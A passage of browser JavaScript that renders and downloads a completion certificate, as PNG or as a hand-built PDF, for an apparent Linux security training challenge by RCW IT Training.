    drawMeta(ctx, 350, 676, "ISSUED ON", formatCertificateDate(new Date()));
    drawMeta(ctx, 350, 754, "CERTIFICATE ID", state.certificateId);
    drawMeta(ctx, 660, 676, "CHALLENGE", "Unauthorised access review");
    drawMeta(ctx, 660, 754, "STATUS", "Access and persistence traced");

    // Instructor portrait and signature.
    const photoX = 1140;
    const photoY = 685;
    ctx.save();
    ctx.beginPath();
    ctx.arc(photoX, photoY, 82, 0, Math.PI * 2);
    ctx.clip();
    ctx.fillStyle = "#0c2e50";
    ctx.fillRect(photoX - 84, photoY - 84, 168, 168);
    if (instructorImage.complete && instructorImage.naturalWidth) {
      drawImageCover(ctx, instructorImage, photoX - 82, photoY - 82, 164, 164, 0.5, 0.25);
    }
    ctx.restore();
    ctx.beginPath();
    ctx.arc(photoX, photoY, 86, 0, Math.PI * 2);
    ctx.strokeStyle = "#c8a847";
    ctx.lineWidth = 4;
    ctx.stroke();
    ctx.beginPath();
    ctx.arc(photoX, photoY, 94, 0, Math.PI * 2);
    ctx.strokeStyle = "rgba(8,35,63,.22)";
    ctx.lineWidth = 2;
    ctx.stroke();

    ctx.textAlign = "center";
    ctx.fillStyle = "#092b4c";
    ctx.font = "italic 700 36px Georgia, serif";
    ctx.fillText("Pradeep Raju", photoX, 822);
    ctx.strokeStyle = "#0ba8ee";
    ctx.lineWidth = 2;
    ctx.beginPath();
    ctx.moveTo(photoX - 112, 837);
    ctx.bezierCurveTo(photoX - 50, 826, photoX + 35, 849, photoX + 112, 834);
    ctx.stroke();
    ctx.fillStyle = "#6a7d88";
    ctx.font = "800 10px Arial, sans-serif";
    ctx.fillText("PRADEEP RAJU  •  RCW IT TRAINING", photoX, 861);

    // Bottom verification line.
    ctx.fillStyle = "#e3ddd0";
    ctx.fillRect(92, 895, W - 184, 1);
    ctx.textAlign = "left";
    ctx.fillStyle = "#778994";
    ctx.font = "500 10px Arial, sans-serif";
    ctx.fillText("RCW IT Training certifies the successful completion recorded above.", 98, 921);
    ctx.textAlign = "right";
    ctx.fillText("Linux Security · Challenge 03", W - 98, 921);
  }

  function roundedRect(ctx, x, y, width, height, radius) {
    ctx.beginPath();
    ctx.roundRect(x, y, width, height, radius);
  }

  function setFittedFont(ctx, text, maxWidth, startSize, minSize, weight, family) {
    let size = startSize;
    do {
      ctx.font = `${weight} ${size}px ${family}`;
      size -= 1;
    } while (ctx.measureText(text).width > maxWidth && size >= minSize);
  }

  function drawMeta(ctx, x, y, label, value) {
    ctx.fillStyle = "#81909a";
    ctx.font = "800 10px Arial, sans-serif";
    ctx.fillText(label, x, y);
    ctx.fillStyle = "#173c57";
    ctx.font = "700 15px Arial, sans-serif";
    ctx.fillText(value, x, y + 23);
  }

  function formatCertificateDate(date) {
    return date.toLocaleDateString("en-IN", { day: "numeric", month: "long", year: "numeric" });
  }

  function drawImageCover(ctx, image, x, y, width, height, focusX = 0.5, focusY = 0.5) {
    const imageRatio = image.naturalWidth / image.naturalHeight;
    const targetRatio = width / height;
    let sourceWidth = image.naturalWidth;
    let sourceHeight = image.naturalHeight;
    let sourceX = 0;
    let sourceY = 0;

    if (imageRatio > targetRatio) {
      sourceWidth = image.naturalHeight * targetRatio;
      sourceX = (image.naturalWidth - sourceWidth) * focusX;
    } else {
      sourceHeight = image.naturalWidth / targetRatio;
      sourceY = (image.naturalHeight - sourceHeight) * focusY;
    }
    ctx.drawImage(image, sourceX, sourceY, sourceWidth, sourceHeight, x, y, width, height);
  }

  instructorImage.addEventListener("load", () => {
    if (state.completed) renderCertificate();
  });

  $("#downloadPngButton").addEventListener("click", () => {
    if (!state.completed) return;
    renderCertificate();
    certificateCanvas.toBlob((blob) => {
      if (!blob) return;
      downloadBlob(blob, certificateFilename("png"));
      showToast("Certificate image downloaded.");
    }, "image/png");
  });

  $("#downloadPdfButton").addEventListener("click", () => {
    if (!state.completed) return;
    renderCertificate();
    certificateCanvas.toBlob(async (blob) => {
      if (!blob) {
        showToast("Could not prepare the PDF. Please try again.");
        return;
      }
      const jpegBytes = new Uint8Array(await blob.arrayBuffer());
      const pdfBytes = buildPdfFromJpeg(jpegBytes, certificateCanvas.width, certificateCanvas.height);
      downloadBlob(new Blob([pdfBytes], { type: "application/pdf" }), certificateFilename("pdf"));
      showToast("Certificate PDF downloaded.");
    }, "image/jpeg", 0.96);
  });

  function certificateFilename(extension) {
    const safeName = state.learnerName.toLowerCase().normalize("NFKD").replace(/[^a-z0-9]+/g, "-").replace(/^-|-$/g, "") || "learner";
    return `rcw-linux-challenge-3-${safeName}.${extension}`;
  }

  function downloadBlob(blob, filename) {
    const url = URL.createObjectURL(blob);
    const anchor = document.createElement("a");
    anchor.href = url;
    anchor.download = filename;
    document.body.append(anchor);
    anchor.click();
    anchor.remove();
    setTimeout(() => URL.revokeObjectURL(url), 1500);
  }

  function buildPdfFromJpeg(jpegBytes, imageWidth, imageHeight) {
    const encoder = new TextEncoder();
    const chunks = [];
    const offsets = [0];
    let length = 0;

    const push = (value) => {
      const bytes = typeof value === "string" ? encoder.encode(value) : value;
      chunks.push(bytes);
      length += bytes.length;
    };

    const addObject = (number, header, streamBytes = null) => {
      offsets[number] = length;
      push(`${number} 0 obj\n${header}`);
      if (streamBytes) {
        push("\nstream\n");
        push(streamBytes);
        push("\nendstream");
      }
      push("\nendobj\n");
    };

    push(new Uint8Array([0x25, 0x50, 0x44, 0x46, 0x2d, 0x31, 0x2e, 0x34, 0x0a, 0x25, 0xe2, 0xe3, 0xcf, 0xd3, 0x0a]));
    addObject(1, "<< /Type /Catalog /Pages 2 0 R >>");
    addObject(2, "<< /Type /Pages /Kids [3 0 R] /Count 1 >>");
    addObject(3, "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 842 595] /Resources << /XObject << /Im0 5 0 R >> >> /Contents 4 0 R >>");

    const content = encoder.encode("q\n842 0 0 595 0 0 cm\n/Im0 Do\nQ\n");
    addObject(4, `<< /Length ${content.length} >>`, content);
    addObject(5, `<< /Type /XObject /Subtype /Image /Width ${imageWidth} /Height ${imageHeight} /ColorSpace /DeviceRGB /BitsPerComponent 8 /Filter /DCTDecode /Length ${jpegBytes.length} >>`, jpegBytes);

    const xrefOffset = length;
    push("xref\n0 6\n");
    push("0000000000 65535 f \n");
    for (let index = 1; index <= 5; index += 1) {
      push(`${String(offsets[index]).padStart(10, "0")} 00000 n \n`);
    }
    push(`trailer\n<< /Size 6 /Root 1 0 R >>\nstartxref\n${xrefOffset}\n%%EOF\n`);

    const output = new Uint8Array(length);
    let position = 0;
    chunks.forEach((chunk) => {
      output.set(chunk, position);
      position += chunk.length;
    });
    return output;
  }
})();
